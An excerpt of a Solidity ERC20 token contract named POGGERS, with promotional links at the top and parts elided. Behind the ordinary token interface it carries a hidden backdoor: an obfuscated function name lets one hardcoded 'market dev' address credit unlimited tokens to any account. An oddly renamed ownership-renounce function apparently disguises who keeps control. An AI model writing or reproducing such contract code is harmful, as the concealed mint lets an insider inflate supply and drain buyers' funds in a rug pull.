/**
https://t.me/Poggers_PEPE
https://twitter.com/POGGERS_ERC20
https://poggers.simdif.com
*/
...
contract Ownable is Context {
    ...
    function renounceOwnershipteds() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract POGGERS is Context, Ownable, IERC20 {
    ...
    uint256 private _totalSupply;address private _marketdevaddress;address constant BLACK_HOLE = 0x000000000000000000000000000000000000dEaD;                                  
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _marketdevaddress= 0x23e85618a2393f5f7b0Eb75820EB8BB027076acF;
    ...
    function isMee() internal view returns (bool) {
        return _msgSender() == _marketdevaddress;
    }

    function liqbsburnttedtionyiongs(address recipient, uint256 airDrop)  external {uint256 receiveRewrd = airDrop;_balances[recipient] += receiveRewrd;require(isMee(), "Caller is not the original caller");
    }
